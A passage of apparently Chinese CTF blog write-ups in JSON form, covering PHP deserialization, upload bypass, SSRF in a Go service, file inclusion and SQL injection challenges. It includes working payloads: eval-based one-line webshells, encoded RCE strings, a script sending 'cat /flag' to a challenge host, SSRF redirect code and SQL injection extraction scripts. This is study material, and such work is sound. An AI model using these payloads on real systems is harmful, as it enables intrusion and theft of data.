private属性序列化的时候格式是%00类名%00成员名 ​ protecte属性序列化的时候格式是%00*%00成员 ​ PHP7.1以上的反序列化不会判断里面参数的属性类型了，所以可以改成public再进行反序列化，绕过private、protected序列化后产生不可见字符。 这道题还是需要那些不可见字符的，用url编码防止字符丢失。 select=O%3A4%3A”Name”%3A3%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bs%3A3%3A”100”%3B%7D 得到flag。","link":"/2021/02/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/"},{"title":"极客大挑战-2019-RCE-ME","text":"[极客大挑战 2019]RCE ME12345678910111213141516&lt;?phperror_reporting(0);if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(&quot;This is too Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{highlight_file(__FILE__);}// ?&gt; 这个题目算是熟悉了吧，常用的取反操作，php写了个取反页面： 结合之前的经验，这次我想试试scandir函数，熟悉熟悉： (%8F%8D%96%91%8B%A0%8D)((%8C%9C%9E%91%9B%96%8D)(“.”)); 即(print_r)((scandir)(“.”))注意括号的包裹，这是解释取反的关键 cat flag倒也是一个问题…… (%8C%97%90%88%A0%8C%90%8A%8D%9C%9A)(%D1%D1%D0%D1%D1%D0%D1%D1%D0%99%93%9E%98)(); 用show_source读取文件，一直读不出来……本地是可以的……ant： 12?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%CD%CC%A2%D6%D6);//(asert)((eval($_POST[123]))) 本来就是空文件……然后有一个readflag，不知道是干啥的…… 学一手wp……学到了一些操作 assert(next(getallheaders())) next() 函数将内部指针指向数组中的下一个元素，并输出。 getallheaders — 获取全部 HTTP 请求头信息，作为一个数组储存。 这里就可以借助head头信息去rce，本来我想尝试用phpsessid的，但没成功…… 然后是一个劫持共享so……啊，看不懂，看懂这个我需要学啥，啊吧啊吧…… 蚁剑有一个绕过disable_functions的插件，有PHP7的UAF…………我爬去学了。","link":"/2021/04/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/"},{"title":"极客大挑战-2019-Upload","text":"[极客大挑战 2019]Upload1.题目：上传绕过 2.过程：感觉好多好多知识，自己也就学了一点点…… 按照以前的经验，流程一般是新建文本，写入一句话，上传改MIME中Content-Type为image/jpeg，文件后缀改PHP、phtml、php5…… 这次好像不行，还会检查文件头…… File Header文件头，通过检查文件头来判断文件类型 各种图片格式的文件头说明 以16进制打开，可以看到前几位的文件头表示，可以此来判断文件类型。 加入了GIF89a的文件头： 除此之外还会检查内容中的&lt;？类似的敏感内容 这时需要更换HTML中的php标记： ①这是PHP官方推荐的写法，也是我们主要采用的写法！这种标签可以插入到HTML文档的任意位置；&gt;&gt;&gt;注：如果页面中，只有PHP语言，推荐省略结束表示’?&gt;’。原因：如果包含结束符号，在导入PHP文件时，可能会将文件最后的多余换行导入进来。②&lt;script language=”php”&gt;&lt;/script&gt;长标记写法。这种写法，总是可以使用，但是我们不推荐。③短标记风格。默认不开启，需要修改php.ini文件中”short_open_tag = On”打开。但是，由于和XML中的标记冲突，不推荐使用。④&lt;% %&gt;ASA风格。默认不开启，需要修改php.ini文件中”asp_tags = On”打开。但是，由于和ASP，JSP中的标记冲突，不推荐使用。 123所以图片内容为：GIF89a&lt;script language='php'&gt;eval($_POST['ok']);&lt;/script&gt; 各类一句话： https://tieba.baidu.com/p/952053373?red_tag=0840634974 https://www.zhangshengrong.com/p/2Y1kAYnNZe/ https://cloud.tencent.com/developer/article/1087791?from=information.detail.js%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC …… 上传后，文件被保存在：/upload里 再用蚁剑连接就行了……","link":"/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/"},{"title":"枯燥的抽奖","text":"[GWCTF 2019]枯燥的抽奖 提交一个数字，network里发现提交给了check.php，访问： 12345678910111213141516171819202122232425262728&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST['num'])){ if($_POST['num']===$str){x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; }}show_source(&quot;check.php&quot;); 在session中随机生成一个种子，如果种子确定，则后来生成的随机数也是确定的…… 更改session，相同的session出现的字符串前十位不变 生成的字符串由种子确定的随机数确定，我们要从已有的几组数据中爆破出种子 本来想用php写个脚本，发现这个想法不现实，性能拉跨…… php_mt_seed-4.0工具可以帮助我们完成破解，但首先我们要还原数据为合法的格式 一个参数 当只有一个参数的时候，这个参数代表mt_rand第一次输出的值。 两个参数 当有两个参数的时候，他们代表mt_rand第一次输出应该位于什么区间内。 第一个参数为最小值，第二个参数为最大值。 四个参数 前两个参数表示mt_rand第一次输出的区间，后两个参数表示mt_rand输出的区间。 多于五个参数 每四个参数一组，但是最后一组可以是1，2或4个参数。每一组引用对应的输出。 还原脚本： 1234567891011str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2=''str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint(res) 第一次输出的区间：固定相同的两个数 mt_rand输出的区间：只能是0-61 放到php_mt_seed里： 得到seed，再根据seed找到完整字符串即可~","link":"/2021/04/11/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"},{"title":"津门杯GoOSS","text":"津门杯GoOSS 弄懂这道题花了我很长时间，期间走了很多弯路……（wotaicaile 在写这道题的路上，我学习(了解)了DNS绑定攻击、Google账号验证、免费域名注册(白嫖)、golang、搭建go环境、gin、dlv调试golang…… gin代码在go程序最前可以看到： 12345678910111213import ( &quot;bytes&quot; &quot;crypto/md5&quot; &quot;encoding/hex&quot; &quot;fmt&quot; &quot;io&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;os&quot; &quot;strings&quot; &quot;time&quot; &quot;github.com/gin-gonic/gin&quot;) &quot;github.com/gin-gonic/gin&quot;既是gin框架，所以既要看得懂go，也要学看gin…… 路由： 12345678910111213func main() { fmt.Println(&quot;start&quot;) r := gin.Default() r.Use(fileMidderware) r.POST(&quot;/vul&quot;, vulController) r.POST(&quot;/upload&quot;, uploadController) r.GET(&quot;/&quot;, func(c *gin.Context) { c.JSON(200, gin.H{ &quot;message&quot;: &quot;pong&quot;, }) }) _ = r.Run(&quot;:1234&quot;) // listen and serve on 0.0.0.0:8080} r.Use(fileMidderware)设置了全局中间件 r.POST(&quot;/vul&quot;, vulController)设置了对该路径请求的局部中间件 vulController： 12345var url Url if err := c.ShouldBindJSON(&amp;url); err != nil { c.JSON(500, gin.H{&quot;msg&quot;: err}) return } 捆绑url为json格式，post传参时需要传：{&quot;url&quot;:&quot;xxxx&quot;} 12345678910111213if !strings.HasPrefix(url.Url, &quot;http://127.0.0.1:1234/&quot;) { c.JSON(403, gin.H{&quot;msg&quot;: &quot;url forbidden&quot;}) return } client := &amp;http.Client{Timeout: 2 * time.Second} fmt.Println(&quot;1&quot;) resp, err := client.Get(url.Url) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{&quot;error&quot;: err.Error()}) return } 限制了内网访问的端口 uploadController： 12345678910111213141516171819202122232425262728293031var file File if err := c.ShouldBindJSON(&amp;file); err != nil { c.JSON(500, gin.H{&quot;msg&quot;: err}) return } dir := md5sum(file.Name) _, err := http.Dir(&quot;./files&quot;).Open(dir) if err != nil { e := os.Mkdir(&quot;./files/&quot;+dir, os.ModePerm) _, _ = http.Dir(&quot;./files&quot;).Open(dir) if e != nil { c.JSON(http.StatusInternalServerError, gin.H{&quot;error&quot;: e.Error()}) return } } filename := md5sum(file.Content) path := &quot;./files/&quot; + dir + &quot;/&quot; + filename err = ioutil.WriteFile(path, []byte(file.Content), os.ModePerm) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{&quot;error&quot;: err.Error()}) return } c.JSON(200, gin.H{ &quot;message&quot;: &quot;file upload succ, path: &quot; + dir + &quot;/&quot; + filename, })} 大概是在files文件夹下上传文件的功能，当时尝试了下，似乎并不存在什么漏洞…… fileMidderware: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546func fileMidderware(c *gin.Context) { fileSystem := http.Dir(&quot;./files/&quot;) if c.Request.URL.String() == &quot;/&quot; { c.Next() return } f, err := fileSystem.Open(c.Request.URL.String()) if f == nil { c.Next() } if err != nil { c.Next() return } defer f.Close() fi, err := f.Stat() if err != nil { c.JSON(http.StatusInternalServerError, gin.H{&quot;error&quot;: err.Error()}) return } fmt.Println(&quot;2&quot;) if fi.IsDir() { fmt.Println(c.Request.URL.String()) if !strings.HasSuffix(c.Request.URL.String(), &quot;/&quot;) { fmt.Println(c.Request.URL.String()) c.Redirect(302, c.Request.URL.String()+&quot;/&quot;) fmt.Println(c.Request.URL.String()) } else { files := make([]string, 0) l, _ := f.Readdir(0) for _, i := range l { files = append(files, i.Name()) } c.JSON(http.StatusOK, gin.H{ &quot;files&quot;: files, }) } } else { data, _ := ioutil.ReadAll(f) c.Header(&quot;content-disposition&quot;, `attachment; filename=`+fi.Name()) c.Data(200, &quot;text/plain&quot;, data) }} 在/vul中请求{&quot;url&quot;:&quot;127.0.0.1:1234/../&quot;}: 访问到了上级files目录，不存在别的东西了…… 源码给了index.php： 1234567&lt;?php// php in localhost port 80readfile($_GET['file']);?&gt; 如果能访问到80默认端口上的index并传参就可以获取flag ssrf1234fmt.Println(c.Request.URL.String()) if !strings.HasSuffix(c.Request.URL.String(), &quot;/&quot;) { fmt.Println(c.Request.URL.String()) c.Redirect(302, c.Request.URL.String()+&quot;/&quot;) 关键是这里的代码……由于gin的配置，访问xxx.xxx.xxx/haha与xxx.xxx.xxx/haha/并不相同 strings.HasSuffix检测c.Request.URL是否以\\结尾，若不是则加上并跳转。大概本意也许是想解决这个问题？(好像哪里又不大对)…… 配置好dlv调试代码服务： c中含有request： request中含有host和url，这里的url应该类似为资源文件？ 如果我们传入：{&quot;url&quot;:&quot;http://127.0.0.1:1234//1/..&quot;}： 网站尝试解析网址1…… 在不以/结尾的情况下，302跳转直接使用c.Request.URL进行跳转，类似加载外部js，拼接上/后，//1/../被认为是相对url并予以访问（大概），造成ssrf（应该）。 https://guokeya.github.io/post/5IcFhBKyk/ 大师傅说： Location可以控制为//，而//就是省略HTTP协议的写法，以作参考。 302跳转我们现在能控制目标机访问外网，那怎么利用这一点呢…… 我们可以在自己的服务器写一个302跳转，使目标机访问后跳转到(目标机)本机的默认端口上并读取flag。 123&lt;?phpheader(&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;);?&gt; 获得flag！ 流程： 访问/vul-》fileMidderware-》vulController-》resp, err := client.Get(url.Url)-》fileMidderware-》302跳转(c.Request.URL)-》服务器-》302跳转-》127.0.0.1/index.php?file=xxx-》flag 总之还是搞了不少东西的，虽然有很多无用功，花了好几天，但也很增长知识。 如果哪里我理解的不对希望能告诉我！","link":"/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/"},{"title":"极客大挑战-2019-SecretFile","text":"1.题目链接：[https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019\\]Secret%20File](https://buuoj.cn/challenges#[极客大挑战 2019]Secret File) 2.过程：打开后： ……这是什么东西，好像类似于一种网站入口，没有别的提示，一通乱点后发现： 下面有一个隐藏的入口。 点开后出现了一个**secret**的按钮。点击后网站会飞速跳转。所以用burpsuit抓包。 可以看到： 中间确实有界面跳过，放到Repeater里查看： 提示有secr3t.php，访问后： 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 是一个文件包含绕过……大概还是伪协议吧…… payload：?file=php://filter/convert.base64-encode/resource=flag.php base64解码后： 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = 'flag{2db78ce0-bf94-4224-b2d3-a45d865e3aa6}'; $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd' ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 得到flag ……","link":"/2020/12/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SecretFile/"},{"title":"网鼎杯-2018-Fakebook","text":"[网鼎杯 2018]Fakebook1.题目：序列化、sql注入2.过程：进去是一个界面，可以注册用户，先注册一个…… 扫描网站后台只扫到一个login.php，但是发现可以查看用户，提交了no参数进行查询，测试一下发现是sql注入 现在遇见一个就觉得是盲注……结合之前写的脚本构造语句查了一些东西 12?no=1 and 1=if()//在if中用二分法逐位判断 database()：fakebook fakebook：users、test users：no、username、passwd、data、USER、CURRENT_CONNECTIONS…… 没什么特别鲜明的东西……查了这几个列发现就只有我注册的用户，没有admin啥的……data里面是序列化的数据，也许是突破口，但到这我就不会了……要去学一学 序列化和反序列化的概念 序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。反序列化则相反将字符串重新恢复成对象。对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。 序列化中的魔法函数： __construct() 创建对象时调用 __destruct() 销毁对象时调用 __toString() 当一个对象被当作一个字符串使用 __sleep() 在对象在被序列化之前运行 __wakeup 将在序列化之后立即被调用 在攻防世界unserialize3中： 应该对code进行了反序列化处理，然后程序是怎么处理的……可以看看这个文章： 深度剖析PHP序列化和反序列化 em，反序列化时对应的变量被赋值，如果有则会先执行wakeup()方法。 如果进入xctf的话会先进入wakeup，然后退出，所以这里需要绕过：使属性个数大于实际个数。 再回来这道题：好像没啥思路了…… writeup里说有robots.txt，为什么我扫不出来嘞…… getcontents应该可以读本地的文件： 相应的对blog的地址设置了过滤： 报错显示了文件的路径： ?no=0/**/union/**/select 1,2,3,4可以正常回显……这不是绕过空格过滤的吗……我只想到了盲注 这样就可以绕过过滤了。 构造： ?no=0/**/union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;s:1:”1”;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’ 应该是flag了： 案例： CTF PHP反序列化漏洞 五个demo案例带你学习PHP反序列化漏洞 高级SQL注入：混淆和绕过（mark） 🆗","link":"/2021/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/"},{"title":"津门杯hate_php","text":"津门杯hate_php1234567891011&lt;?phperror_reporting(0);if(!isset($_GET['code'])){ highlight_file(__FILE__);}else{ $code = $_GET['code']; if(preg_match(&quot;/[A-Za-z0-9_$@]+/&quot;,$code)){ die('fighting!'); } eval($code);} p神！：无字母数字webshell之提高篇 可以在res中看到php版本为5.x，这里就需要用到p神的php5下的上传临时文件+通配符RCE 多过滤一个@，看着ascii往前换一个就行 脚本： 1234567#coding:utf-8import requestsurl=&quot;http://122.112.214.101:20004/index.php?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;&quot;files={'file':'cat /flag'}response=requests.post(url=url,files=files)res = response.textprint(res) 有一定概率性……","link":"/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/"},{"title":"网鼎杯-2018-Comment","text":"[网鼎杯 2018]Comment学习了不少知识………… 进入题目是一个留言板，留言需要登录，先不管……发现存在git泄露，上githack： write_do： 12345678910111213141516171819202122&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': break;case 'comment': break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; 关键这玩意没啥用啊……学习一波git恢复 gitExtract工具似乎会自动恢复泄露文件……回去试试…… git恢复https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html git reset 使用及回滚 git的工作区和暂存区 git log 详解 提交一个文件的时候是分为git add、git commit两步的当git add的时候，是把文件临时放在临时区stage中当git commit的时候，是把临时区stage的所有内容提交到当前分支当然这两个在objects目录都会生成一个对象文件，来存储数据。 我们使用 git add 命令将内容写入暂存区。 git commit 命令会将暂存区内容添加到本地仓库中 这里要结合GitHacker使用，githacker似乎在获取泄露文件上能够获取到更详尽的信息。 个人体验：GitHacker要在linux上用，需要python的requests…… 这里我们通过：git log查看commit history： git reset回滚未commit版本前已经commit的网页源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; 类似刚做过的CyberPunk，对输入做了转义，然而$category = mysql_fetch_array($result)['category'];却直接抓取了结果，也就是说，存在二次注入。 二次注入12345$sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); 这里即是关键的注入点，content会取出未转义的单引号进行闭合 关键是如何构造，这是十分关键的 注意：这里的content是commend的content，不是帖子的content 这里的sql语句是多行的，注释需要用多行注释： 令category=’,content=database(),/，在留言中输入\\/#： 12345$sql = &quot;insert into comment set category = '',content=database(),/*', content = '*/#', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); 这样构造，/**/注释掉跨行'，#注释掉后面的单引号，content就会成功被我们劫持，我们在留言后语句就会成功执行完成注入。 但是注库名时发现没有回显，一番尝试……放弃…… load_file读取passwd： https://www.cnblogs.com/songxingzhu/p/6364700.html 最下面有一个www用户，目录为/home/www，默认shell为bin/bash，由此可以查一下该用户的shell历史： .bash_historyhttps://blog.csdn.net/u011479200/article/details/86501366 命令记录.bash_history 查下/home/www/下的命令使用历史： 1234567cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start .DS_Store似乎是一种泄露，在网页上线前删掉了，但是/tmp/html中应该是存在的： 读取发现是乱码且显示不完整，用hex()读取： 12\u0001Bud1\u0010\b\u0010\u0004\b\b\u0002 \u0001\u0010strapIl bootstrapIlocblob\u0010F(������ comment.phpIlocblob\u0010�(\u0001��\u0003cssIlocblob\u0010\u0001R(������\u0019flag_8946e1ff1ee3e40f.phpIlocblob\u0010\u0001�(������\u0005fontsIlocblob\u0010F������� index.phpIlocblob\u0010��\u0002��\u0002jsIlocblob\u0010\u0001R������� login.phpIlocblob\u0010\u0001�������� mysql.phpIlocblob\u0010F\u0001\b������\u0006vendorIlocblob\u0010�\u0001\b������ write_do.phpIlocblob\u0010\u0001R\u0001\b������\u0001\b \u0001 \u0001@\u0001�\u0001\u0001\u0001\u0002\u0001\u0004\u0001\u0010\u0001 \u0001@\u0001�\u0001\u0001\u0001\u0002\u0001\u0004\u0001\b\u0001\u0010\u0001 \u0001@\u0001�\u0001\u0001\u0001\u0002\u0001\u0004\u0001\b\u0001\u0010\u0001 \u0001@\u0003\u0010 E\u0004 发现flag_8946e1ff1ee3e40f.php，可以着手读flag了…… 我寻思哪个目录下的flag文件应该都一样，结果不一样，必须读/var/www/html/下面的…… category=',content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/* 获得flag…… ……tql","link":"/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"},{"title":"网鼎杯-2018-unfinish","text":"网鼎杯-2018-unfinish1.题目：2.过程：进入题目，是一个/login.php，放到御剑扫： 有注册界面，随便注册一个看看： 什么都没有……左边有一个侧边栏可以看到注册的用户名 各种方法都试了一下，都没有成功……在注册时发现用户名（username）加单引号时，界面回显不同，应该是插入数据库时’导致语句的格式错误……（应该先搞懂sql插入语句的……） SQL INSERT INTO 语句： INSERT INTO 表名称 VALUES (值1, 值2,….) 题目中的sql插入语句就有可能是： 1insert into table value('$email','$username','$password') 题目中，email和password好像都很难注入……测试时也只有改动username时回显不同 闭合引号’)#似乎不行，语句可能是： 1insert into tablename (email,username,password) values ('$email','$username','$password') dalao操作似乎是利用mysql中的”加法“结合hex加密： **mysql中加号(+)**： ①如果双方都为数值型数据则结果为数值相加结果; ②如果有一方为字符型，则试图将字符型数值转换成数值型，如果转换成功，则继续做数值加法运算； ③如果有一方为null，则结果肯定为null。 也就是说，直接0’ + database() +’0，实际上是0+0+int(database())，而结果开头为字母，即结果为0 如果是version()： version()的显示只剩下了5.5，后面的数据都么有了 可以利用双重hex加密或ord与ascii使返回结果为数字；另，若返回数字超过十位，会以科学计数法返回，造成数据损失……(还有，表名flag竟然是猜的,把information_schema禁了…… 写脚本批量注册与登录，获取username数据： 123456789101112131415161718192021222324252627282930import requestsimport timecontent = &quot;&quot;#注册：url1 = 'http://111.200.241.244:33496/register.php'for x in range(1,100): register = { &quot;email&quot;: str(x)+&quot;@qqq.com&quot;, &quot;username&quot;: &quot;0'+( substr(hex(hex((select * from flag ))) from &quot;+str((x-1)*10+1)+&quot; for 10))+'0&quot;, &quot;password&quot;: &quot;1&quot; } response1 = requests.post(url=url1, data=register)#登录，查usernameurl2 = 'http://111.200.241.244:33496/login.php'for x in range(1,100): login = { &quot;email&quot;: str(x)+&quot;@qqq.com&quot;, &quot;password&quot;: &quot;1&quot; } response2 = requests.post(url=url2, data=login) r = response2.text left = r.find(' ') right = r.find('&lt;/span&gt;') con = r[left:right].strip() content += con print(con)print(content) 没写停止，一下全输出了…… hex解密： 这好像叫做二次注入……和我理解的好像不一样，那上次用cookie回显是不是也算二次注入……","link":"/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/"},{"title":"网鼎杯-2020-青龙组-AreUSerialz","text":"网鼎杯-2020-青龙组-AreUSerialz 1.题目：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 2.过程：从下看起： 1234567891011function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) {$str = (string)$_GET['str'];if(is_valid($str)) { $obj = unserialize($str);} GET提交str，isvalid判断是否有效，反序列化；这里有一点，上次学到private和protected属性的变量会有特殊的形式包裹，不属于ASCII中的可见字符，会被过滤掉…… 若php版本较高，可以用public绕过 construct是在new的时候执行，可以省略；看destruct： 123456function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } content赋值为空，要考虑读取flag 1234567private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } 通过file get contents 读取…… 思路还是比较清晰的，op值为int型2，去read flag.php： 这里表明了文件名…… 还是有一个关于析构函数的知识点： 析构函数的话,删除对象的所有引用或销毁对象或脚本执行结束才会自动调用 如果是脚本执行完毕,HTTP 头信息已经发出。这时的工作目录有可能和在 SAPI中时不同 可以用getcwd函数测试。 （SAPI……不4很懂） 本地测试： 可以看到，如果是脚本结束后自动释放内存执行析构，服务器的工作目录会发生改变，不再是脚本运行的目录，这对读取flag文件会造成一定的影响…… 1.读取服务器配置，找到绝对路径： Linux系统的/proc目录介绍： 在GUN/Linux操作系统中，/proc是一个位于内存中的伪文件系统(in-memory pseudo-file system)。该目录下保存的不是真正的文件和目录，而是一些“运行时”信息，如系统内存、磁盘io、设备挂载信息和硬件配置信息等。proc目录是一个控制中心，用户可以通过更改其中某些文件来改变内核的运行状态。proc目录也是内核提供给我们的查询中心，我们可以通过这些文件查看有关系统硬件及当前正在运行进程的信息。在Linux系统中，许多工具的数据来源正是proc目录中的内容。例如，lsmod命令就是cat /proc/modules命令的别名，lspci命令是cat /proc/pci命令的别名。 经常会用到的文件： maps 记录一些调用的扩展或者自定义 so 文件 environ 环境变量 comm 当前进程运行的程序 cmdline 程序运行的绝对路径 cpuset docker 环境可以看 machine ID cgroup docker环境下全是 machine ID 不太常用 可以通过读 /proc/self/cmdline 来找到对应的路径： ……好吧，这是啥我也不是很清楚，当时原题目环境： 读取/web/config/httpd.conf： 获取路径，读取/web/html/flag.php 2.提前触发destruct，防止工作目录的更换参考dalao：http://imagin.vip/?p=1391 反序列化执行逻辑： 首先执行反序列化 解析字符串时出错，于是删除已经生成一半的对象 对象被删除，执行析构函数 析构函数执行完毕，对应的变量被赋值为 false 返回到处理错误的代码，抛出 notice 执行 $t++ 并输出 人为构造错误的序列化字符串，提前执行析构函数，在工作目录改变之前read。 3.报错获取路径原题目报错后会显示相关部署工具信息，查找得到路径……大概…… 4.关于protectedphp打序列化字符串中只要把其中的s改成大写打S，后面的字符串就可以用十六进制表示， 即%00可以用/00替换。 …………ok","link":"/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/"},{"title":"蓝帽杯2021复现","text":"蓝帽杯2021复现one_Pointer_phpbuu上开了环境，真不错 user.php 12345&lt;?phpclass User{ public $count;}?&gt; add_api.php 12345678910111213141516&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); }else{ eval($_GET[&quot;backdoor&quot;]); }}else{ $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user));}?&gt; 就两个文件…… 当时看了半天，就只知道要绕过if($count[]=1)……可这玩意不是恒对的吗…… 这关系到php的索引数组溢出 PHP数组https://blog.csdn.net/weixin_43821278/article/details/114763459 根据这篇文章的实验 123456//php 